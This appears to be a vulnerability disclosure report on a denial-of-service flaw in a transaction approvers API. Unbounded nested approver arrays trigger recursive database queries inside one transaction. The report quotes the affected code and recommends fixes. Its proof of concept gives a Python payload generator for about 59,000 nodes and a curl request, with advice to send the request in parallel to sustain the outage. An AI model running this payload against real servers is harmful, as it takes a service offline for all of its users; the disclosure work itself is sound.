### Title
Unbounded Recursive Approver Tree Creation Causes Server-Side Resource Exhaustion (DoS)

### Summary
The `POST /transactions/:transactionId/approvers` endpoint accepts a deeply nested, arbitrarily large approver tree with no size or depth limit enforced at the DTO or service layer. Any authenticated user who creates a transaction can submit a single crafted request containing thousands of nested approver nodes, triggering an unbounded recursive function that issues multiple database queries per node inside a single database transaction, exhausting the DB connection pool and causing server-wide denial of service.

### Finding Description

**Root cause — no `ArrayMaxSize` on either DTO field:**

`back-end/apps/api/src/transactions/dto/create-transaction-approver.dto.ts` lines 17–29:

```typescript
@IsArray()
@ArrayMinSize(1)   // minimum enforced, but NO ArrayMaxSize
@IsOptional()
@ValidateNested({ each: true })
@Type(() => CreateTransactionApproverDto)
approvers?: CreateTransactionApproverDto[];   // unbounded nested array

// ...

export class CreateTransactionApproversArrayDto {
  @IsArray()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approversArray: CreateTransactionApproverDto[];  // unbounded top-level array
}
``` [1](#0-0) 

**Unbounded recursive processing in the service:**

`back-end/apps/api/src/transactions/approvers/approvers.service.ts` lines 244–355 define an inner async function `createApprover` that:
1. Performs at least 3–4 DB queries per node (`isNode` count, `findOne` for parent, `count` for user, `insert`)
2. Recursively calls itself for every element in `dtoApprover.approvers` with no depth or breadth guard
3. All calls execute inside a single `dataSource.transaction(...)` block, holding a DB connection open for the entire duration [2](#0-1) 

**Exploit path:**

1. Attacker registers as a normal user (no admin required).
2. Attacker creates a transaction via `POST /transactions` — any authenticated user can do this.
3. Attacker sends `POST /transactions/:id/approvers` with a payload like:

```json
{
  "approversArray": [
    { "threshold": 1, "approvers": [
      { "threshold": 1, "approvers": [
        { "threshold": 1, "approvers": [
          ... (N levels deep, each with M children)
        ]}
      ]}
    ]}
  ]
}
```

A tree with 5,000 leaf nodes (easily within a 100 KB HTTP body) triggers ~20,000 sequential DB queries inside one open transaction, blocking the connection pool and making the server unresponsive to all other users.

### Impact Explanation

- **DB connection pool exhaustion**: The single long-running transaction holds a connection for the entire recursive walk. Multiple concurrent crafted requests saturate the pool.
- **Memory pressure**: Each recursive frame and its intermediate results accumulate in the Node.js heap for the duration of the request.
- **Server-wide DoS**: All other API users (signing, transaction creation, notifications) are blocked while the pool is held.
- No data is corrupted, but service availability is completely lost for the duration of the attack.

### Likelihood Explanation

- **Attacker preconditions**: Only a valid user account is required — no admin, no leaked credentials.
- **Trigger**: A single HTTP POST request with a crafted JSON body.
- **Repeatability**: The attacker can fire multiple such requests concurrently to sustain the outage.
- The endpoint is documented and publicly reachable. [3](#0-2) 

### Recommendation

1. **Add `ArrayMaxSize` to both DTO fields** in `create-transaction-approver.dto.ts`:

```typescript
import { IsArray, IsNumber, IsOptional, ValidateNested, ArrayMinSize, ArrayMaxSize } from 'class-validator';

@IsArray()
@ArrayMinSize(1)
@ArrayMaxSize(10)   // sensible upper bound
@IsOptional()
@ValidateNested({ each: true })
@Type(() => CreateTransactionApproverDto)
approvers?: CreateTransactionApproverDto[];

// and on approversArray:
@IsArray()
@ArrayMaxSize(20)
@ValidateNested({ each: true })
@Type(() => CreateTransactionApproverDto)
approversArray: CreateTransactionApproverDto[];
```

2. **Enforce a maximum recursion depth** inside `createApprover` by passing a `depth` counter and throwing if it exceeds a threshold (e.g., 5).

3. **Consider batching DB inserts** rather than one `insert` per node inside the recursive loop.

### Proof of Concept

**Preconditions**: Valid JWT for any registered user; a transaction ID the user created.

```bash
# Step 1 – create a transaction (normal flow, omitted for brevity)
# Step 2 – send crafted approver tree

python3 -c "
import json, sys

def make_tree(depth, width):
    if depth == 0:
        return {'userId': 1}
    return {
        'threshold': 1,
        'approvers': [make_tree(depth - 1, width) for _ in range(width)]
    }

payload = {'approversArray': [make_tree(10, 3)]}  # 3^10 = 59049 nodes
print(json.dumps(payload))
" > payload.json

curl -X POST https://<server>/transactions/1/approvers \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

**Expected outcome**: The server hangs processing ~59,000 recursive DB operations. Concurrent legitimate requests time out. Repeating the request 3–5 times in parallel sustains the outage indefinitely.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction-approver.dto.ts (L1-30)
```typescript
import { IsArray, IsNumber, IsOptional, ValidateNested, ArrayMinSize } from 'class-validator';
import { Type } from 'class-transformer';

export class CreateTransactionApproverDto {
  @IsNumber()
  @IsOptional()
  listId?: number;

  @IsNumber()
  @IsOptional()
  threshold?: number;

  @IsNumber()
  @IsOptional()
  userId?: number;

  @IsArray()
  @ArrayMinSize(1)
  @IsOptional()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approvers?: CreateTransactionApproverDto[];
}

export class CreateTransactionApproversArrayDto {
  @IsArray()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approversArray: CreateTransactionApproverDto[];
}
```

**File:** back-end/apps/api/src/transactions/approvers/approvers.service.ts (L244-355)
```typescript
      await this.dataSource.transaction(async transactionalEntityManager => {
        const createApprover = async (dtoApprover: CreateTransactionApproverDto) => {
          /* Validate Approver's DTO */
          this.validateApprover(dtoApprover);

          /* Check if the approver already exists */
          if (await this.isNode(dtoApprover, transactionId, transactionalEntityManager))
            throw new Error(this.APPROVER_ALREADY_EXISTS);

          /* Check if the parent approver exists and has threshold */
          if (typeof dtoApprover.listId === 'number') {
            const parent = await transactionalEntityManager.findOne(TransactionApprover, {
              where: { id: dtoApprover.listId },
            });

            if (!parent) throw new Error(this.PARENT_APPROVER_NOT_FOUND);

            /* Check if the root transaction is the same */
            const root = await this.getRootNodeFromNode(
              dtoApprover.listId,
              transactionalEntityManager,
            );
            if (root?.transactionId !== transactionId)
              throw new Error(this.ROOT_TRANSACTION_NOT_SAME);
          }

          /* Check if the user exists */
          if (typeof dtoApprover.userId === 'number') {
            const userCount = await transactionalEntityManager.count(User, {
              where: { id: dtoApprover.userId },
            });

            if (userCount === 0) throw new Error(this.USER_NOT_FOUND(dtoApprover.userId));
          }

          /* Check if there are sub approvers */
          if (
            typeof dtoApprover.userId === 'number' &&
            dtoApprover.approvers &&
            dtoApprover.approvers.length > 0
          )
            throw new Error(this.ONLY_USER_OR_TREE);

          /* Check if the approver has threshold when there are children */
          if (
            dtoApprover.approvers &&
            dtoApprover.approvers.length > 0 &&
            (dtoApprover.threshold === null || isNaN(dtoApprover.threshold))
          )
            throw new Error(this.THRESHOLD_REQUIRED);

          /* Check if the approver has children when there is threshold */
          if (
            typeof dtoApprover.threshold === 'number' &&
            (!dtoApprover.approvers || dtoApprover.approvers.length === 0)
          )
            throw new Error(this.CHILDREN_REQUIRED);

          /* Check if the approver threshold is less or equal to the number of approvers */
          if (
            dtoApprover.approvers &&
            (dtoApprover.threshold > dtoApprover.approvers.length || dtoApprover.threshold === 0)
          )
            throw new Error(this.THRESHOLD_LESS_OR_EQUAL_APPROVERS(dtoApprover.approvers.length));

          const data: DeepPartial<TransactionApprover> = {
            transactionId:
              dtoApprover.listId === null || isNaN(dtoApprover.listId) ? transactionId : null,
            listId: dtoApprover.listId,
            threshold:
              dtoApprover.threshold && dtoApprover.approvers ? dtoApprover.threshold : null,
            userId: dtoApprover.userId,
          };

          if (typeof dtoApprover.userId === 'number') {
            const userApproverRecords = await this.getApproversByTransactionId(
              transactionId,
              dtoApprover.userId,
              transactionalEntityManager,
            );

            if (userApproverRecords.length > 0) {
              data.signature = userApproverRecords[0].signature;
              data.userKeyId = userApproverRecords[0].userKeyId;
              data.approved = userApproverRecords[0].approved;
            }
          }

          /* Create approver */
          const approver = transactionalEntityManager.create(TransactionApprover, data);

          /* Insert approver */
          await transactionalEntityManager.insert(TransactionApprover, approver);
          approvers.push(approver);

          /* Continue creating the three */
          if (dtoApprover.approvers) {
            for (const nestedDtoApprover of dtoApprover.approvers) {
              const nestedApprover = { ...nestedDtoApprover, listId: approver.id };

              if (!nestedDtoApprover.approvers || nestedDtoApprover.approvers.length === 0) {
                nestedApprover.threshold = null;
              }

              await createApprover({ ...nestedDtoApprover, listId: approver.id });
            }
          }
        };

        for (const approver of dto.approversArray) {
          await createApprover(approver);
        }
```

**File:** back-end/apps/api/src/transactions/approvers/approvers.controller.ts (L47-54)
```typescript
  @Post()
  createTransactionApprovers(
    @GetUser() user: User,
    @Param('transactionId', ParseIntPipe) transactionId: number,
    @Body() body: CreateTransactionApproversArrayDto,
  ): Promise<TransactionApprover[]> {
    return this.approversService.createTransactionApprovers(user, transactionId, body);
  }
```
